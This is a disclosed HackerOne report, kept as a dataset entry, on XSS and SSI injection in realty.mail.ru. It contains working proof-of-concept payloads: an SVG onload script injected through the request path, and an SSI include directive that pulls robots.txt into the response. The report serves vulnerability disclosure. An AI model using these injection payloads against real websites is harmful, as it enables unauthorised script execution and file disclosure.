---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '159985'
original_report_id: '159985'
title: '[realty.mail.ru] XSS, SSI Injection'
weakness: Command Injection - Generic
team_handle: mailru
created_at: '2016-08-17T08:41:29.445Z'
disclosed_at: '2016-10-06T12:23:27.926Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- command-injection-generic
---

# [realty.mail.ru] XSS, SSI Injection

## Metadata

- HackerOne Report ID: 159985
- Weakness: Command Injection - Generic
- Program: mailru
- Disclosed At: 2016-10-06T12:23:27.926Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

XSS
===
**PoC**
Открыть с помощью **Internet Explorer**
```
https://blackfan.ru/x?r=https://realty.mail.ru/%22--%3e%3csvg/onload=alert(document.domain)%3e/%252e%252e
```
**Request**
```
GET /"--><svg/onload=alert(document.domain)>/.. HTTP/1.1
Host: realty.mail.ru
Connection: close
``` 

SSI Injection
===
**PoC**
Request-URI также попадает в SSI код
```
GET //#"--><!--#include file="robots.txt"--> HTTP/1.1
Host: realty.mail.ru
Connection: close
```

**Response**
```
<link rel="alternate" type="application/rss+xml" title="Недвижимость Mail.Ru" href="https://realty.mail.ru/rss/"/><script type="application/ld+json">
						{
							"@context": "http://schema.org",
							"@type": "WebPage",
							"headline": "404 - К сожалению, такой страницы нет на сайте",
							"url": "https://realty.mail.ru/#"-->User-Agent: *
Allow: /static-remont/remont/xml/
Disallow: /searching/
Disallow: /search/
Disallow: /srch/
Disallow: /searchfor/
Disallow: /detail/ru-mos
Disallow: /detail/foreign
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
